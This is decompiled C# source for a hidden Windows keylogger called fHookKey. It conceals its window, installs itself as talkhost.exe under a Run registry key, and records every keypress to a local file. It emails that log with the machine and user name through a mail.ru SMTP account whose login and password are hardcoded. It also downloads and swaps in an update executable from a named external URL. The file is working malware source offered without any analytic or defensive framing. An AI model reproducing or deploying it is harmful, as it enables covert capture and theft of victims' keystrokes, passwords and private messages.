using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

public sealed class fHookKey : Form
{
	private string string_0 = string.Empty;

	private string string_1 = string.Empty;

	private string string_2 = string.Empty;

	private string string_3 = string.Empty;

	private string string_4 = string.Empty;

	private int int_0 = 0;

	private BackgroundWorker backgroundWorker_0;

	private IContainer icontainer_0 = null;

	private TextBox tBox_KeyUp;

	private TextBox tBox_KeyDown;

	private TextBox tBox_KeyPress;

	private Label label1;

	private Label label2;

	private Label label3;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ExStyle(createParams.get_ExStyle() | 0x80);
			return createParams;
		}
	}

	public fHookKey()
	{
		//IL_0135: Unknown result type (might be due to invalid IL or missing references)
		//IL_013f: Expected O, but got Unknown
		Application.add_ThreadException((ThreadExceptionEventHandler)method_5);
		AppDomain.CurrentDomain.UnhandledException += method_4;
		InitializeComponent();
		((Form)this).set_Opacity(0.0);
		((Control)this).set_Visible(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		string_0 = Process.GetCurrentProcess().ProcessName;
		string_3 = Environment.GetFolderPath(Environment.SpecialFolder.InternetCache);
		string_1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		string_2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\tim.dll";
		string_4 = Application.get_ExecutablePath();
		backgroundWorker_0 = new BackgroundWorker();
		backgroundWorker_0.DoWork += backgroundWorker_0_DoWork;
		method_0();
		method_13();
		method_14(method_1());
		method_3();
		method_10();
		GClass1.smethod_44(new KeyPressEventHandler(method_8));
	}

	private void backgroundWorker_0_DoWork(object sender, DoWorkEventArgs e)
	{
		Thread.Sleep(5000);
		method_0();
	}

	private void method_0()
	{
		try
		{
			if (File.Exists("C:\\talkhost.exe"))
			{
				File.Delete("C:\\talkhost.exe");
			}
			if (File.Exists("C:\\hookkey.exe"))
			{
				File.Delete("C:\\hookkey.exe");
			}
		}
		catch
		{
		}
	}

	private void fHookKey_Shown(object sender, EventArgs e)
	{
	}

	private string method_1()
	{
		return string.Format("{0}.{1} {2} {3} {4}", Environment.MachineName, Environment.UserName, DateTime.Now.ToShortDateString(), DateTime.Now.ToShortTimeString(), "1.8");
	}

	private void method_2(object sender, InputLanguageChangedEventArgs e)
	{
	}

	private void method_3()
	{
		string text = string_1 + "\\talkhost.exe";
		FileInfo fileInfo = new FileInfo(text);
		if (new FileInfo(string_4).DirectoryName == fileInfo.DirectoryName)
		{
			return;
		}
		Registry.CurrentUser.OpenSubKey("SOFTWARE", writable: true)!.OpenSubKey("Microsoft", writable: true)!.OpenSubKey("Windows", writable: true)!.OpenSubKey("CurrentVersion", writable: true)!.OpenSubKey("Run", writable: true)!.SetValue("TalkHost", text, RegistryValueKind.String);
		if (!File.Exists(text))
		{
			File.Copy(string_4, text, overwrite: true);
		}
		else if (!method_11(new FileInfo(string_4), fileInfo))
		{
			Process[] processesByName = Process.GetProcessesByName("talkhost");
			foreach (Process process in processesByName)
			{
				process.Kill();
			}
			Thread.Sleep(1000);
			File.Copy(string_4, text, overwrite: true);
		}
		Process process2 = new Process();
		process2.StartInfo.FileName = text;
		process2.StartInfo.CreateNoWindow = true;
		process2.StartInfo.LoadUserProfile = true;
		process2.StartInfo.WorkingDirectory = string_1;
		process2.Start();
		process2.Close();
		process2.Dispose();
		Process.GetCurrentProcess().Kill();
	}

	private void method_4(object sender, UnhandledExceptionEventArgs e)
	{
		StreamWriter streamWriter = new StreamWriter(string_2, append: true);
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write(e.ExceptionObject.ToString());
		streamWriter.Write(Environment.NewLine);
		streamWriter.Close();
	}

	private void method_5(object sender, ThreadExceptionEventArgs e)
	{
		StreamWriter streamWriter = new StreamWriter(string_2, append: true);
		streamWriter.Write(Environment.NewLine);
		streamWriter.Write(e.Exception.Message);
		streamWriter.Write(Environment.NewLine);
		streamWriter.Close();
	}

	private void method_6(object sender, KeyEventArgs e)
	{
	}

	private void method_7(object sender, KeyEventArgs e)
	{
	}

	private void method_8(object sender, KeyPressEventArgs e)
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Invalid comparison between Unknown and I4
		StreamWriter streamWriter = new StreamWriter(string_2, append: true, Encoding.UTF8);
		Keys val = (Keys)(byte)e.get_KeyChar();
		if ((int)val != 13)
		{
			streamWriter.Write(e.get_KeyChar());
		}
		else
		{
			streamWriter.Write(Environment.NewLine);
		}
		if (int_0++ > 512)
		{
			streamWriter.Write(Environment.NewLine);
			streamWriter.Write(method_1());
			streamWriter.Write(Environment.NewLine);
		}
		streamWriter.Close();
	}

	private bool method_9(string string_5)
	{
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_5);
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			Stream responseStream = httpWebResponse.GetResponseStream();
			new StreamReader(responseStream).ReadToEnd();
			return true;
		}
		catch
		{
			return false;
		}
	}

	private void method_10()
	{
		WebClient webClient = new WebClient();
		try
		{
			string text = "http://www.beespace.com.ua/hook/hookkey.exe";
			if (method_9(text))
			{
				webClient.DownloadFile(text, Environment.GetFolderPath(Environment.SpecialFolder.InternetCache) + "\\hookkey.exe");
				webClient.Dispose();
				FileInfo fileInfo = new FileInfo(Environment.GetFolderPath(Environment.SpecialFolder.InternetCache) + "\\hookkey.exe");
				FileInfo fileInfo2 = new FileInfo(string_1 + "\\talkhost.exe");
				if (!method_11(fileInfo, fileInfo2))
				{
					File.Replace(fileInfo.FullName, fileInfo2.FullName, Environment.GetFolderPath(Environment.SpecialFolder.InternetCache) + "\\bk");
				}
			}
		}
		catch (Exception ex)
		{
			method_14(ex.Message);
		}
	}

	private bool method_11(FileInfo fileInfo_0, FileInfo fileInfo_1)
	{
		FileStream fileStream = fileInfo_0.OpenRead();
		FileStream fileStream2 = fileInfo_1.OpenRead();
		byte[] array = MD5.Create().ComputeHash(fileStream);
		byte[] array2 = MD5.Create().ComputeHash(fileStream2);
		int num = 0;
		while (true)
		{
			if (num < array.Length)
			{
				if (array[num] != array2[num])
				{
					break;
				}
				num++;
				continue;
			}
			fileStream.Close();
			fileStream2.Dispose();
			return true;
		}
		fileStream.Close();
		fileStream2.Dispose();
		return false;
	}

	private IPStatus method_12(string string_5)
	{
		Ping ping = new Ping();
		PingReply pingReply;
		try
		{
			pingReply = ping.Send(string_5);
		}
		catch (Exception)
		{
			return IPStatus.IcmpError;
		}
		return pingReply.Status;
	}

	private void method_13()
	{
		if (!File.Exists(string_2))
		{
			return;
		}
		try
		{
			SmtpClient smtpClient = new SmtpClient("smtp.mail.ru", 587);
			if (method_12(smtpClient.Host) != 0)
			{
				throw new Exception("no ping");
			}
			smtpClient.EnableSsl = true;
			smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
			smtpClient.UseDefaultCredentials = false;
			smtpClient.Credentials = new NetworkCredential("6.5000@mail.ru", "mailru65");
			MailMessage mailMessage = new MailMessage("6.5000@mail.ru", "6.5000@mail.ru");
			mailMessage.Attachments.Add(new Attachment(string_2));
			mailMessage.Body = Environment.MachineName + "." + Environment.UserName;
			mailMessage.Subject = "helloworld";
			smtpClient.Send(mailMessage);
			mailMessage.Dispose();
		}
		catch (Exception ex)
		{
			File.WriteAllText(string_2, ex.ToString());
		}
		finally
		{
			File.WriteAllText(string_2, string.Empty);
		}
	}

	private void method_14(string string_5)
	{
		StreamWriter streamWriter = new StreamWriter(string_2, append: true, Encoding.UTF8);
		streamWriter.Write(string_5);
		streamWriter.Write(Environment.NewLine);
		streamWriter.Close();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		tBox_KeyUp = new TextBox();
		tBox_KeyDown = new TextBox();
		tBox_KeyPress = new TextBox();
		label1 = new Label();
		label2 = new Label();
		label3 = new Label();
		((Control)this).SuspendLayout();
		((Control)tBox_KeyUp).set_Location(new Point(74, 12));
		((TextBoxBase)tBox_KeyUp).set_Multiline(true);
		((Control)tBox_KeyUp).set_Name("tBox_KeyUp");
		((Control)tBox_KeyUp).set_Size(new Size(162, 56));
		((Control)tBox_KeyUp).set_TabIndex(0);
		((Control)tBox_KeyDown).set_Location(new Point(74, 74));
		((TextBoxBase)tBox_KeyDown).set_Multiline(true);
		((Control)tBox_KeyDown).set_Name("tBox_KeyDown");
		((Control)tBox_KeyDown).set_Size(new Size(162, 65));
		((Control)tBox_KeyDown).set_TabIndex(1);
		((TextBoxBase)tBox_KeyPress).set_BorderStyle((BorderStyle)1);
		((Control)tBox_KeyPress).set_Location(new Point(74, 145));
		((TextBoxBase)tBox_KeyPress).set_Multiline(true);
		((Control)tBox_KeyPress).set_Name("tBox_KeyPress");
		((Control)tBox_KeyPress).set_Size(new Size(162, 57));
		((Control)tBox_KeyPress).set_TabIndex(2);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(12, 55));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(40, 13));
		((Control)label1).set_TabIndex(3);
		((Control)label1).set_Text("KeyUP");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Location(new Point(12, 126));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(53, 13));
		((Control)label2).set_TabIndex(4);
		((Control)label2).set_Text("KeyDown");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Location(new Point(12, 190));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(51, 13));
		((Control)label3).set_TabIndex(5);
		((Control)label3).set_Text("KeyPress");
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)0);
		((Control)this).set_BackColor(SystemColors.Control);
		((Form)this).set_ClientSize(new Size(243, 212));
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)tBox_KeyPress);
		((Control)this).get_Controls().Add((Control)(object)tBox_KeyDown);
		((Control)this).get_Controls().Add((Control)(object)tBox_KeyUp);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("fHookKey");
		((Form)this).add_Shown((EventHandler)fHookKey_Shown);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
